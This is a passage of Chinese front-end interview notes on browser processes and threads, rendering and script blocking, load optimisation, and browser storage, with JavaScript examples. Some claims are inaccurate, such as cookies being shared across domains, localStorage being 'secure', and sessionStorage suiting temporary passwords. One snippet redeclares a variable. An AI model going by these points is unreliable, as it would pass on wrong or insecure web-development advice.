- 信号量使用不当。当进程间使用信号量进行同步和互斥时，如果没有遵循正确的操作规则，也可能造成死锁。例如，一个进程在执行P操作时被阻塞，而没有执行相应的V操作来释放信号量；或者一个进程在执行V操作时被抢占，而没有执行相应的P操作来获取信号量。

## 5. JavaScript是单线程的原因

单线程是指一个程序或者一个进程只有一个执行线程，也就是说同一时间只能执行一件任务，其他任务必须等待当前任务完成后才能执行。JavaScript是一门单线程的语言，它的主要用途是操作DOM（文档对象模型），实现用户和网页的交互。如果JavaScript是多线程的，那么可能会出现同时修改同一个DOM元素的情况，导致页面混乱或者崩溃。因此，为了保证页面的稳定性和一致性，JavaScript被设计成单线程的。

总之，JavaScript是单线程的，但是可以通过事件循环和任务队列来实现异步操作。这样既可以避免多线程带来的复杂性和风险，又可以提高用户体验和性能。

## 6. 浏览器的进程有哪些？

- 浏览器主进程（Browser Process）：这是浏览器的核心进程，负责协调和管理其他进程，以及处理用户界面、标签页、地址栏、书签栏等浏览器功能。浏览器主进程只有一个，它是浏览器的入口和出口。
- 渲染进程（Render Process）：这是浏览器用来渲染网页的进程，负责执行JavaScript、计算CSS样式、构建DOM树、布局和绘制等网页渲染任务。渲染进程可以有多个，每个标签页或者框架都可以对应一个渲染进程，它们之间是相互隔离的，以保证安全和稳定。
- 网络进程（Network Process）：这是浏览器用来处理网络请求的进程，负责与服务器进行通信，下载网页资源，支持HTTP协议和缓存等网络功能。网络进程可以有多个，但是一般只有一个，它为所有渲染进程提供服务。
- GPU进程（GPU Process）：这是浏览器用来执行GPU相关任务的进程，负责处理3D绘制、视频解码、页面合成等GPU加速的功能。GPU进程可以有多个，但是一般只有一个，它为所有渲染进程提供服务。
- 插件进程（Plugin Process）：这是浏览器用来运行插件的进程，负责加载和执行插件代码，如Flash、PDF等。插件进程可以有多个，每个插件都可以对应一个插件进程，它们与渲染进程通过IPC（Inter-Process Communication）进行通信。

## 7. 渲染进程中有哪些线程

- GUI渲染线程：负责渲染页面，解析HTML和CSS，构建DOM树和CSSOM树，生成渲染树，以及绘制页面。重绘和重排也是在该线程执行。该线程和主线程是互斥的，当主线程执行时，GUI渲染线程会被挂起，反之亦然。
- 计时器线程：负责处理setInterval和setTimeout的定时器任务。因为主线程是单线程的，如果处于阻塞状态，那么计时器就会不准确，所以需要单独的线程来负责计时器工作。当计时器到期时，该线程会把对应的回调函数加入到任务队列中，等待主线程空闲时执行。
- 异步HTTP请求线程：负责处理XMLHttpRequest的异步请求任务。当请求完成后，该线程会把回调函数加入到事件队列中，等待主线程空闲时执行。
- 事件触发线程：负责控制事件循环，比如主线程遇到计时器、AJAX异步请求等，就会将对应任务添加到事件触发线程中，在对应事件符合触发条件时，就把事件添加到待处理队列的队尾，等待主线程处理。

总之，打开一个页面，除了主线程用来执行JavaScript外，还有GUI渲染线程、计时器线程、异步HTTP请求线程、事件触发线程等辅助线程，它们各司其职，协同工作，共同完成页面的加载、渲染和交互等功能。

## 8. 如何在一个页面执行多个线程

### 浏览器的多线程

1. 浏览器在一个页面中本身就存在多个线程，介绍相关内容
2. 浏览器的线程我们是不能使用js来控制的，它们是由浏览器本身管理的。

### JavaScript多线程

JavaScript在一个页面中可以通过Web Workers、Service Workers等方式创建一些后台线程，比如来执行一些耗时的任务，处理网络请求，缓存资源，推送通知等功能，他们不会影响主线程的运行。但这些线程并不是浏览器本身就开启的，而是由JavaScript代码创建的。这些线程也不能访问DOM，也不能直接和其他标签页通信，需要通过一些特定的API来实现。

**注：**他们都属于==宏任务==的一部分。

**了解**

- Web Workers API用来执行一些耗时的计算任务，比如图像处理，数据分析，机器学习等。这些任务如果在主线程上运行，可能会导致页面卡顿或者无响应。通过将这些任务放在后台线程上运行，可以提高页面的性能和用户体验。
- Service Workers API用来处理网络请求，缓存资源，推送通知等功能。这些功能可以让页面在离线状态下也能正常工作，或者在后台接收消息和更新。通过使用Service Workers线程，可以提高页面的可靠性和实时性。
- SharedArrayBuffer和Atomics对象用来实现内存共享和原子操作，让不同的线程可以读写同一块内存数据。这样可以实现更高效的数据交换和同步，但也需要注意避免数据竞争和死锁等问题。这些对象可以用来实现一些高性能的并行计算，比如WebAssembly，WebGL等。

## 9. 浏览器渲染页面的时候哪些进程或者线程在工作？

浏览器主进程（Browser Process）：负责协调、主控，以及负责各个页面的管理，创建和销毁其他进程。

渲染进程（Renderer Process）：负责一个 Tab 内的语言解析和页面渲染。每个 Tab 页面都有一个渲染进程，互不影响。渲染进程内部又有多个线程，如：

- GUI 渲染线程：负责解析 HTML 和 CSS，构建 DOM 树和 CSSOM 树，合并成渲染树，计算布局和绘制页面。该线程与 JS 引擎线程是互斥的，当 JS 引擎执行时，GUI 线程会被挂起，反之亦然。
  JS 引擎线程：负责处理 Javascript 脚本，执行代码。该线程与 GUI 线程互斥，为了防止 JS 脚本修改 DOM 而导致渲染结果不一致，JS 执行会阻塞页面渲染。
- 事件触发线程：负责将准备好的事件交给 JS 引擎线程执行。例如，当一个点击事件发生时，该线程会将点击事件的回调函数添加到任务队列中，等待 JS 引擎线程空闲时执行。
- 定时器触发线程：负责处理异步的定时器函数，如 setTimeout 和 setInterval。该线程会在指定时间后将定时器的回调函数添加到任务队列中，等待 JS 引擎线程空闲时执行。
- 异步 HTTP 请求线程：负责处理异步的网络请求，如 XMLHttpRequest 或 fetch。该线程会在网络请求完成后将回调函数添加到任务队列中，等待 JS 引擎线程空闲时执行。

GPU 进程：负责处理 GPU 相关的操作，如 3D 绘制或页面合成。该进程会接收来自渲染进程的层和纹理信息，然后将各层合成为最终的图像，并显示到屏幕上。

网络进程（Network Process）：负责页面的网络资源加载，如处理网络请求、DNS 查询、TCP 握手、TLS 协商等。该进程为每个渲染进程提供网络服务，并且可以被多个渲染进程共享。



# 浏览器渲染原理

## 1.浏览器的渲染流程

### 简化版：渲染过程

> [渲染树的形成原理你真的很懂吗? - 掘金 (juejin.cn)](https://juejin.cn/post/6844903983052488717)
>
> [Dom树 CSS树 渲染树(render树) 规则、原理 - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1715276)
>
> [浏览器渲染页面的流程\_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV18f4y1H7Zu/?vd_source=7ce3f834cb0c7108338f1996b4436d48)

浏览器渲染页面的流程大致如下：

- 浏览器从网络层**获取请求文档**的内容，如HTML文件。

- 【DOM】浏览器解析HTML文件，构建DOM树，即将HTML文档中的所有内容转换为节点，并形成层级关系。

  CSS一般在link标签中，所以在解析HTML文件的时候，会请求对应的CSS文件。

- 【CSSOM】浏览器解析CSS文件，构建CSSOM树，即将CSS文档中的所有样式转换为节点，并形成层级关系。CSSOM树会继承和覆盖父节点的样式，形成最终的样式规则。

- 【渲染树】浏览器将DOM树和CSSOM树合并为渲染树（Render Tree），即将每个DOM节点和对应的CSS样式关联起来，形成一个包含==可见元素==和样式信息的树结构。

  - 不会被呈现出来的，就不会在渲染树上显示。例如标签：meta，link，设置display:none的元素
  
  
    - 渲染树是在DOM树和CSSOM树构建的过程中同时进行的，不是等到DOM树和CSSOM树都构建完毕才开始。浏览器会尽可能地提前构建渲染树，以便更快地显示页面内容。
  


- 【布局阶段】浏览器根据渲染树计算每个**可见元素的布局，**即确定每个元素的位置和大小，以及其他几何属性。

- 【绘制阶段】浏览器根据布局信息绘制每个可见元素，即将像素渲染到屏幕上。这一步可能涉及到分层、合成和光栅化等过程，以提高渲染效率和性能。【都记住】

**注意**

- 浏览器在渲染过程中(这里的渲染指的是构建渲染树的过程，而不是布局和布局绘制)，可能会遇到JavaScript文件或代码，这时会暂停渲染，交给JavaScript引擎执行，因为JavaScript可能会修改DOM或CSSOM，影响渲染结果。执行完毕后，浏览器会恢复渲染。

- 浏览器在渲染完成后，如果遇到DOM或CSSOM的变化，可能会触发重绘（repaint）或重排（reflow），即重新计算布局或绘制元素。重排一定会引起重绘，而重绘不一定会引起重排。重排和重绘都会影响渲染性能，应尽量避免或减少。

### 详细版：渲染过程（暂时不看）

> - [渲染流程（上）：HTML、CSS和JavaScript是如何变成页面的 | 浏览器工作原理与实践 (poetries.top)](https://blog.poetries.top/browser-working-principle/guide/part1/lesson05.html#构建dom树)
> - [渲染流程（下）：HTML、CSS和JavaScript是如何变成页面的 | 浏览器工作原理与实践 (poetries.top)](https://blog.poetries.top/browser-working-principle/guide/part1/lesson06.html)

## 2.渲染过程的阻塞问题

> 相似问题：
>
> - DOM解析中遇到标签怎么办？针对不同的标签，有什么处理过程？

### 关键含义

#### 加载

**加载**是指浏览器通过网络请求从服务器获取文件的过程。对于所有外部资源（CSS文件、JS文件、字体、图片等）来说，加载是指发起HTTP/HTTPS请求并接收响应的数据。

#### 解析

**解析**是指浏览器将文件内容转换成更结构化的数据格式，从而能够进行后续处理的过程。

- 对于 **JS文件**，解析是将文本文件里的代码字符串转换成可理解和执行的脚本结构，通常为抽象语法树（AST）。
- 对于 **CSS文件**，解析是指将CSS代码转换成浏览器能够理解的结构化数据，构建出CSSOM树。

#### 执行

**执行**是在完成解析后，浏览器按照解析的结果进行操作的阶段。

- 对于 **JS文件**，执行意味着浏览器开始根据解析出来的脚本逻辑进行实际的计算和操作。这可能包括修改DOM、设置CSS样式、注册事件监听器，以及更多使网页动态交互的活动。
- 对于 **CSS文件**，执行通常指的是应用解析完成后的样式到渲染树上，计算最终的样式并应用到布局和绘制过程，这通常不被称作"执行"，而是样式的"应用"(application)或"渲染"(rendering)。

### CSS

#### 场景

1. 遇到link标签，请求CSS文件：CSS样式表通常在`<head>`中通过`<link>`标签加载，浏览器必须先加载和解析这些CSS文件然后才能渲染页面，因此它们会阻塞渲染。但这不会阻塞文档的解析过程。
2. 遇到style标签：内联样式，尽管不需要加载外部资源，但直到样式被处理完毕前都会阻塞渲染。

#### 结论

CSS 文件的加载不会阻塞 DOM 的解析（DOM的构建），但阻塞会页面的渲染，也就是说，浏览器会先构建 DOM 树，然后等待 CSS 文件加载完毕并构建 CSSOM 树，再合并生成渲染树并渲染页面。

#### 详细原因

- CSS会阻塞渲染树的生成。

  渲染树是用于绘制页面的树，它需要DOM树和CSSOM树的合并。DOM树是HTML文档的结构，CSSOM树是CSS样式表的结构。浏览器在生成渲染树时，需要等待CSSOM树的完成，因为CSSOM树会影响DOM树中元素的可见性和样式。因此，如果CSS文件加载缓慢或阻塞，会导致页面渲染延迟或白屏现象。

- CSS会阻塞JavaScript脚本的执行。

  JavaScript脚本是用于定义和控制网页逻辑和交互的语言。浏览器在执行JavaScript脚本时，需要等待CSSOM树的完成，因为JavaScript脚本可能会访问或修改CSSOM树中的节点。因此，如果CSS文件加载缓慢或阻塞，会导致JavaScript脚本执行延迟或错误。

#### 注意

==DOM的渲染==不仅包括了DOM树的构建，还包括了渲染树的构建和绘制。DOM的解析和DOM的渲染不是一个意思，DOM的解析只是DOM的渲染过程中的第一步，而DOM的渲染还涉及到CSSOM树、渲染树、布局和绘制等步骤。【==我统一改成了页面的渲染==】

### JavaScript

> 或者提问：遇到script标签对于DOM解析渲染的影响

#### 结论

**本质**：JS会影响DOM树和CSSOM的构建，因为JS可能会操作DOM元素或者CSS的样式；

1. DOM 树构建时当遇到 JavaScript 脚本，就要暂停 DOM 解析，JS脚本的加载和运行都会阻塞DOM的解析，因为JS会操作DOM；

2. 当JS脚本加载完毕后，还要判断 CSS文件加载以及CSSOM树是否解析完成，因为在 JavaScript 可能会操作 CSSOM节点（操作CSS样式），CSSOM 节点确认解析完成，执行 JavaScript 再次回到 DOM 树创建。（**所以这里也可以说CSS解析间接影响DOM树创建**）

#### async和defer

如果 JS 文件有 ==async== 或 ==defer== 属性，那么浏览器会异步加载和执行 JS 文件，不会阻塞 DOM 的解析和渲染。只有没有这些属性的 JS 文件才会同步加载和执行，阻塞 DOM 的解析和渲染。

- **阻塞解析**: 当浏览器遇到一个没有`async`或`defer`属性的`<script>`标签时，它会暂停DOM的进一步解析，直到脚本完全加载并执行完毕。这是因为脚本可能会修改当前的DOM结构，例如通过`document.write`。
- **异步执行**: 如果`<script>`标签有`async`属性，浏览器将在加载脚本的同时继续解析文档，并在脚本加载完成后尽快执行它，不一定等到文档解析完成。脚本的加载过程不会阻止HTML的解析，但脚本的执行仍然会阻塞文档的解析完成。
- **延迟执行**: 如果`<script>`标签有`defer`属性，脚本会延迟到整个文档解析和显示完毕后再执行，减少了对页面渲染的阻塞效果。

### 其他

#### `<img>`

图片标签本身并不阻塞解析，但浏览器需要加载图片资源，这可能会增加页面的整体加载时间。

#### `<audio>` 和 `<video>`

媒体元素本身不会直接影响HTML的解析，但浏览器会请求媒体资源，这可能会影响页面加载时间，并且若存在自动播放，可能会阻塞页面的onload事件

### 总结

#### DOM什么时候停止解析？

遇到JS文件。因为JS要操作DOM，所以DOM树此时停止解析。

#### 页面什么时候停止渲染？

渲染树取决于DOM的解析和CSS的解析，因此当影响到DOM解析和CSS解析的时候，就会影响渲染。

1. 渲染是DOM+CSSOM的结果，因此遇到加载CSS文件的时候，不会继续渲染，但是会进行DOM会继续解析；

2. 同理JS也会影响渲染：

   - DOM的解析要等待JS的执行完毕，因为JS要对DOM进行操作；

   - 而JS的执行要等待CSSOM的构建完成，因为JS要对CSS进行操作。

   - 进一步的说，CSS文件也会影响渲染，

   注意，因为遇到JS之后，DOM不解析同样也不会访问到后续的CSS文件，因此可以说JS会阻塞CSS

### 面试题

#### script标签执行报错会导致dom解析失败吗

**回答内容**：

1. 不会。`<script>`标签中的JavaScript代码执行错误通常不会导致整个DOM解析失败。浏览器是健壮的，并且设计有错误处理机制。当遇到JavaScript执行错误时，浏览器会抛出一个错误，可能在控制台中显示出来，但是它会继续解析剩余的HTML文档，构建DOM树。
2. 但是

但是，需要注意的是，如果JavaScript代码中的错误影响到了后续的JavaScript执行，比如定义的变量或者函数因为某个错误未能正确声明，那么这些后续的JavaScript代码可能无法按预期执行。然而，这种情况并不等同于DOM解析的失败，只是脚本执行的失败。

如果希望JavaScript代码错误不影响后续代码的执行，可以采取一些措施，如：

- 使用`try...catch`语句来捕获和处理异常。
- 通过分离脚本，确保一个脚本的错误不会中断其他脚本的加载和执行。
- 采用适当的错误监听和窗口全局错误处理事件（例如：`window.onerror`）来记录错误并决定应对策略。

以上都是在编程中常用的错误处理技术，能够使得即便在单个脚本发生错误的情况下，网页的主要功能依然可以保持运作。

## 3.浏览器的渲染优化

见浏览器优化

## 4.回流和重绘

见CSS面试题

## 经典面试题

> 主要是不知道具体分类到哪里

### 怎么加快资源文件的请求

加快资源文件请求的速度通常涉及到优化资源的大小与加载方式、提高网络转输速度、以及创造更好的缓存策略等。以下是一些建议：

#### 1.资源优化

- **压缩资源**：使用工具（如Gzip或Brotli）来压缩文本文件（HTML、CSS、JavaScript）。
- **最小化资源**：去除代码中不必要的空格、注释、和未使用的代码。
- **优化图像**：减小图像尺寸，使用WebP等现代格式，及仅加载视窗内需要显示的图像（懒加载）。

#### 2.使用CDN

- **内容分发网络（CDN）**：将资源放置在全球分布式的服务器上，用户总是从最近的服务器下载资源，减少延迟。

#### 3.缓存策略

- **合理的缓存**：利用浏览器缓存，通过合理配置Cache-Control或Expires头使得用户在再次访问时不必下载不变的资源。
- **使用Service Worker**：允许更细粒度的资源缓存管理和离线支持。

#### 4.HTTP/2

- **利用HTTP/2协议**：HTTP/2支持头部压缩、服务器推送、流量控制以及请求的多路复用等特性，这些都可以显著加快资源文件的请求速度。

#### 5.资源加载策略

- **优先加载关键资源**：通过资源优先级提示（如`<link rel="preload">`）、异步或延迟加载脚本（`async`和`defer`属性）来管理资源的加载顺序。
- **代码拆分**：只加载当前需要的代码块，利用现代框架提供的代码拆分功能。

#### 6.DNS预解析

- **DNS prefetching**：使用`<link rel="dns-prefetch">`来提前解析第三方域名的DNS，减少DNS查询时间。

#### 7.减少请求数量

- **合并文件**：将多个CSS或JavaScript文件合并成一个，减少HTTP请求的次数。
- **Sprite图**：将多张小图标文件合成一张图片，减少HTTP请求的数量，用CSS控制显示部位。

#### 8.基础设施提升

- **升级服务器硬件**：提升服务器的响应速度和吞吐量，对于高流量网站特别重要。
- **使用负载均衡**：分散请求到多台服务器，提高资源文件的响应速度。

#### 9.第三方服务

- **外部脚本管理**：减少依赖外部第三方脚本，或者确保从可靠高速的服务上加载。

#### 10.安全性与性能平衡

- **TLS/SSL优化**：通过使用TLS 1.3等更快的协议版本和更少的握手轮次来减少TLS握手时间。

实施以上任何策略之前，建议使用性能监控工具如Lighthouse或WebPageTest等进行测试，找出当前资源加载的瓶颈点。针对具体问题作出针对性优化后，再进行对比测试以验证效果。

### 页面白屏有哪些情况导致

页面白屏指的是网页内容未能显示出来，用户只能看到一个空白的页面。这种现象可能由多种原因导致，包括但不限于：

#### 网络相关

1. **网络延迟**：网页所需的资源下载时间过长，尤其是首次请求时，可以是因为网络慢，服务器响应时间长，或资源体积过大。

#### 服务器相关

1. **服务端渲染问题**：服务器端出现问题，例如，服务器崩溃、后端服务响应延迟或者服务器配置错误等，这些都可能导致生成的HTML未能及时发送到客户端。

#### 前端相关

1. **资源加载失败**：需要的CSS样式、JavaScript脚本或图片资源未能成功加载，可能由于资源路径错误、服务器问题、网络请求被阻止等原因。
2. **JavaScript阻塞**：如果页面的JavaScript脚本在`<head>`中而且没有异步加载，可能会阻塞DOM的解析，直至这些脚本加载完成并执行。
3. **严重的JavaScript错误**：JavaScript代码中的严重错误可能导致脚本提前中止执行，这可以阻止页面的后续渲染。
4. **CSS阻塞**：当外部的CSS被放置在文档的`<head>`中，而且浏览器等待这些文件下载和解析时，会阻塞页面的渲染。
5. **前端路由问题**：在单页应用（SPA）中，前端路由不正确或者在路由跳转时出现的问题，可能会导致页面未能正确渲染。
6. **DOM操作错误**：错误的DOM操作，比如无限循环的DOM插入，会影响浏览器的渲染性能，可能导致白屏。

#### 浏览器

1. **浏览器插件或扩展干扰**：用户浏览器的插件或扩展可能影响页面正常加载，比如广告拦截插件可能会阻止一些网络请求。
2. **跨域策略（CORS）问题**：由于浏览器的同源策略，如果跨域资源没有正确设置CORS头，资源将不会被加载，影响页面内容的显示。
3. **浏览器兼容性问题**：某些CSS特性或JavaScript特性不被特定浏览器支持，也可能导致页面显示不正常。

### 白屏问题的解决方案

#### 网络相关问题的解决思路

- **优化资源加载**：压缩资源、使用缓存策略、合理设置HTTP headers。
- **使用CDN**：将资源放在距用户更近的地方，通过内容分发网络（CDN）减少加载时间。
- **检查和修复资源路径**：确保资源的URL正确，可通过网络请求和响应检查资源状态。

#### 服务端相关问题的解决思路

- **检查后端代码和日志**：了解后端错误的具体原因，并针对性地解决问题。
- **提升服务器资源和性能**：通过增加计算资源或优化代码来处理更多请求。
- **配置管理**：确保Web服务器的配置文件（如nginx.conf、.htaccess）正确无误。
- **数据库优化**：优化查询效率，确保数据库连接稳定等。

#### 前端渲染相关问题的解决思路

- **异步加载JavaScript**：使用`async`或`defer`属性使脚本非阻塞，不影响DOM解析。
- **性能优化**：优化JavaScript执行效率，减少对用户设备资源的压力。
- **分类和优化CSS**：推迟非关键CSS的加载，内联首屏关键样式。
- **错误处理**：使用`try...catch`和全局错误处理来捕获并处理JavaScript错误。
- **路由管理**：对于单页应用，检查前端路由配置，确保正确匹配。

#### 客户端环境相关问题的解决思路

- **浏览器测试和兼容性**：在不同的浏览器和版本中测试网页，确保兼容性。
- **跨域问题处理**：正确设置CORS响应头，使资源可跨域访问。
- **监控和反馈工具**：使用前端监控工具收集用户遇到问题的反馈，以便快速定位问题。

针对页面白屏问题，解决方案通常涉及到对问题进行彻底分析和定位。通常，结合浏览器开发者工具、网络分析和后端日志，可以帮助快速确定造成问题的根源，从而采取针对性的解决措施。此外，简化页面资源和提前进行性能优化也可以显著降低页面白屏的可能性。

### 怎么加快首屏渲染时间

#### 1.优化资源

- **最小化和压缩资源**：使用工具如Uglify、Terser压缩JavaScript，CSS Nano压缩CSS，以及压缩HTML和图像文件。
- **使用有效的缓存**：通过浏览器缓存机制，减少重复资源的下载时间。

#### 2.关键渲染路径优化

- **消除阻塞渲染的CSS和JavaScript**：将关键的CSS内联到HTML中，使用`async`和`defer`属性加载JavaScript，从而不阻塞DOM的解析。
- **优化CSS的交付**：确定关键CSS，并尝试将它内联在`<head>`中。

#### 3.服务端优化

- **利用服务器端渲染(SSR)**：服务端渲染可以加快首屏显示，因为浏览器获得的是已经渲染好的HTML。
- **采用服务端压缩**：使用gzip或Brotli等压缩方法减小资源体积。
- **使用HTTP/2**：利用HTTP/2多路复用功能，减少连接的开销。

#### 4.加载顺序优化

- **预加载关键资源**：使用`<link rel="preload">`预加载首屏必要资源。
- **推迟非关键资源加载**：对于非关键JS脚本与图片等资源，可以用`lazy-load`等技术延迟加载。

#### 5.代码分割

- **实施代码分割**：将代码分割成多个块，仅在需要时加载特定功能的代码。

#### 6.图像优化

- **选择正确的图像格式**：比如WebP格式通常比PNG或JPEG更小。
- **懒加载图像**：只加载用户即将看到的图像，其他图像滚动到视口时再加载。

#### 7.使用Web字体的策略

- **减少字体文件的大小**：通过仅包含需要的字形和风格来减少文件大小。
- **字体加载性能优化**：使用`font-display` CSS属性控制字体加载的行为。

#### 8.使用内容分发网络（CDN）

- **分布式内容分发网络**：通过CDN加速资源下载速度，减少地理位置延迟。

#### 9.性能监控和分析

- **监控工具使用**：利用浏览器开发者工具、Lighthouse、WebPageTest等工具进行性能分析，找出瓶颈，进行针对性的优化。

#### 10.优化JavaScript执行

- **减少JavaScript执行时间**：优化代码逻辑，减少不必要的JavaScript计算。

### 预加载

#### 概念

浏览器根据HTML中的指令开始下载页面上需要的资源。通常情况下，浏览器会根据解析到的资源标签(`<script>`, `<img>`, `<link>`, 等)按顺序下载资源，但是资源的下载通常只有在解析到对应标签时才开始。

**原理：**预加载是一种让浏览器提前加载页面上可能会用到资源的技术，无论这些资源是否立即需要。预加载的目的是利用浏览器的空闲时间提前请求关键资源，从而在真正需要的时候能够直接从内存中读取，加快页面渲染速度，改善用户体验。

#### 实施预加载的HTML标记

html

```html
<link rel="preload" href="path/to/asset" as="type">
```

- `rel="preload"`指明这是一个预加载的请求。
- `href`属性指定所要预加载的资源的URL。
- `as`属性是一个可选项，用于指定预加载资源的类型（如`script`、`style`、`image`等），有助于浏览器决定正确的加载优先级和应用正确的内容安全策略。

#### 预加载的时机

预加载适用于以下场景：

- **页面初始加载时对重要资源的预加载**：一些不立即需要但对页面性能至关重要的资源，例如隐藏的图片、后面将使用的字体文件或将会在用户交云之后使用的JavaScript文件。
- **即将进行的导航预加载**：如果可以预测用户可能执行的导航，比如点击按钮或提交表单后跳转新页面，可以预先加载新页面所需要的关键资源。
- **懒加载资源的预加载**：例如，可能很快就会进入视口的图片或视频。

#### 不足

预加载需要谨慎使用，因为如果预加载过多不必要的资源，可能会消耗用户的带宽，对性能产生负面影响，特别是对于那些使用计量数据流量的用户。

预加载资源确实占用了HTTP请求，也就是说它们消耗了浏览器对特定域名的并发请求限制。大多数现代浏览器对每个域名的并发请求有一定的限额，如果这个限额被占满了，其他资源就必须等待直到之前的请求完成并释放了这个限额。

#### 预加载的例子

假设我们有一个字体文件和一个初始不可见但用户一旦交互就需要的JavaScript文件。

html

```html
<!-- 预加载字体文件 -->
<link rel="preload" href="fonts/custom-font.woff2" as="font" type="font/woff2" crossorigin="anonymous">

<!-- 预加载JavaScript文件 -->
<link rel="preload" href="js/interactive-map.js" as="script">
```

这里字体文件被预加载，因为字体通常需要加载完成并解析后才能应用于页面，这可能导致可见文本内容闪烁或延迟出现；通过预加载，我们可以减少这种效果。

JavaScript文件被预加载，因为虽然它初始化时可能不需要执行，但前提是用户与页面上的某个元素（如互动地图）进行了交互，该脚本将会执行，因此提前加载可以显著提升用户体验。



# 浏览器的本地存储

## 1.浏览器本地存储方式与场景

> [浏览器本地存储的四种方式介绍及区别 - 掘金 (juejin.cn)](https://juejin.cn/post/7158414568950071309?searchId=202308181517379DCD2401E2ED75A6E834#heading-2)

### 总结掌握

> 掌握的内容：
>
> - 概念
> - 大小
> - 存储时间（何时存活）
> - 是否被携带在HTTP请求中？
> - 如何使用
> - 应用场景

浏览器本地存储的四种方式：Cookie，localStorage，sessionStorage和IndexedDB。表格如下：

| 名称           | 生命周期                               | 存储大小         | HTTP请求         |
| :------------- | :------------------------------------- | :--------------- | :--------------- |
| Cookie         | 默认是当前会话有效；也可以指定过期时间 | 一般不超过4KB    | 每次请求都会携带 |
| localStorage   | 永久有效，除非用户手动删除             | 一般为5MB        | 不会随请求发送   |
| sessionStorage | 当前会话有效，关闭浏览器或标签页后失效 | 一般为5MB        | 不会随请求发送   |
| IndexedDB      | 永久有效，除非用户手动删除             | 一般为50MB或更多 | 不会随请求发送   |

**应用场景**

- Cookie：用户的身份信息或偏好设置
- localStorage：用户的长期数据或复杂数据，用户浏览历史，不变的个人信息等
- sessionStorage：用户的短期数据或敏感数据，例如游客登陆信息，临时浏览记录。
- indexedDB：存储资源较大

**关于跨域**

sessionStorage在相同域但是不同的标签页，也是访问的，只在当前的标签页可用。

其他都是在同一域名下即可访问。

### 扩展阅读

#### Cookie

- 特点：Cookie是一种最早出现的浏览器本地存储方式，它是一种由服务器发送给浏览器的小型文本文件，用于保存用户的身份信息、偏好设置等。
- Cookie的优点是可以在不同的页面或域名之间共享数据，也可以在服务器端读取和修改数据。
- Cookie的缺点是容量很小（一般不超过4KB），==安全性较低（容易被窃取或篡改==），并且每次请求都会携带Cookie，增加了网络开销。
- 使用方法：Cookie的使用方法是通过document.cookie属性来读取或设置Cookie的值。Cookie的值是一个由分号分隔的键值对字符串，例如`name=Alice; age=18`。每个键值对都可以设置一些属性，例如`max-age`表示有效期，`path`表示作用范围，`secure`表示是否只在HTTPS下传输等。例如：

```js
// 设置一个名为name，值为Alice，有效期为7天的Cookie
document.cookie = "name=Alice; max-age=604800";

// 读取所有的Cookie
console.log(document.cookie); // 输出"name=Alice"

// 删除一个名为name的Cookie
document.cookie = "name=; max-age=0";
```

- 使用场景：Cookie适合用于保存一些用户的身份信息或偏好设置等数据，例如用户登录状态、购物车内容、网站主题等。这些数据可以在不同的页面或域名之间共享，并且可以在服务器端验证或修改。例如：

```js
// 用户登录后，服务器发送一个包含用户ID和Token的Cookie
document.cookie = "userId=123; token=abc; max-age=86400";

// 用户访问其他页面时，浏览器会自动携带该Cookie
fetch("/api/user/profile", {
  method: "GET",
  credentials: "include", // 表示允许发送Cookie
}).then((response) => {
  // 服务器根据Cookie验证用户身份，并返回用户资料
  return response.json();
}).then((data) => {
  // 显示用户资料
  console.log(data);
});
```

#### localStorage

- 特点：localStorage是一种HTML5提供的浏览器本地存储方式，它是一种以键值对形式存储数据的对象，用于保存用户的长期数据。
- localStorage的优点是容量较大（一般为5MB），安全性较高（只能在客户端访问），并且不会随请求发送给服务器。
- localStorage的缺点是不能在不同的域名之间共享数据，也不能在服务器端读取或修改数据。
- 使用方法：localStorage的使用方法是通过window.localStorage属性来读取或设置localStorage对象的值。localStorage对象的值是一个由字符串组成的键值对，例如`{"name": "Alice", "age": "18"}`。localStorage对象提供了一些方法来操作数据，例如`setItem`表示添加或更新数据，`getItem`表示获取数据，`removeItem`表示删除数据等。例如：

```js
// 设置一个名为name，值为Alice的localStorage
localStorage.setItem("name", "Alice");

// 读取一个名为name的localStorage
console.log(localStorage.getItem("name")); // 输出"Alice"

// 删除一个名为name的localStorage
localStorage.removeItem("name");
```

- 使用场景：localStorage适合用于保存一些==用户的长期数据或复杂数据==，例如用户浏览历史、收藏夹、草稿箱等。这些数据可以在同一域名下的不同页面之间共享，并且可以在客户端进行增删改查等操作。例如：

```js
// 用户浏览了一个商品页面，将商品ID保存到localStorage中
let productId = "p001";
let history = localStorage.getItem("history") || "[]"; // 获取历史记录，如果没有则为空数组
history = JSON.parse(history); // 将字符串转换为数组
history.push(productId); // 将商品ID添加到数组中
history = JSON.stringify(history); // 将数组转换为字符串
localStorage.setItem("history", history); // 将历史记录保存到localStorage中

// 用户访问个人中心页面时，从localStorage中获取历史记录，并显示在页面上
let history = localStorage.getItem("history") || "[]"; // 获取历史记录，如果没有则为空数组
history = JSON.parse(history); // 将字符串转换为数组
let list = document.getElementById("history-list"); // 获取显示历史记录的列表元素
for (let productId of history) {
  // 根据商品ID创建一个列表项元素，并添加到列表中
  let item = document.createElement("li");
  item.textContent = productId;
  list.appendChild(item);
}
```

#### sessionStorage

- 特点：sessionStorage是一种HTML5提供的浏览器本地存储方式，它和localStorage非常类似，也是一种以键值对形式存储数据的对象，用于保存用户的短期数据。
- sessionStorage和localStorage的区别在于sessionStorage只在当前会话有效，也就是说当用户关闭浏览器或标签页时，sessionStorage中的数据就会被清除。sessionStorage也有类似于localStorage的优缺点，只是它不能在不同的标签页之间共享数据。
- 使用方法：sessionStorage的使用方法是通过window.sessionStorage属性来读取或设置sessionStorage对象的值。sessionStorage对象的值是一个由字符串组成的键值对，例如`{"name": "Alice", "age": "18"}`。sessionStorage对象提供了一些方法来操作数据，例如`setItem`表示添加或更新数据，`getItem`表示获取数据，`removeItem`表示删除数据等。例如：

```js
// 设置一个名为name，值为Alice的sessionStorage
sessionStorage.setItem("name", "Alice");

// 读取一个名为name的sessionStorage
console.log(sessionStorage.getItem("name")); // 输出"Alice"

// 删除一个名为name的sessionStorage
sessionStorage.removeItem("name");
```

- 使用场景：sessionStorage适合用于保存一些用户的短期数据或敏感数据，例如表单输入、验证码、临时密码等。这些数据只在当前会话有效，并且可以在客户端进行增删改查等操作。例如：

```js
// 用户填写了一个表单，将表单内容保存到sessionStorage中，以防止意外刷新或关闭页面导致数据丢失
let form = document.getElementById("form"); // 获取表单元素
let inputs = form.getElementsByTagName("input"); // 获取表单中所有的输入框元素
```





# 浏览器事件机制

## 事件模型

### DOM0级事件模型

**特点**:

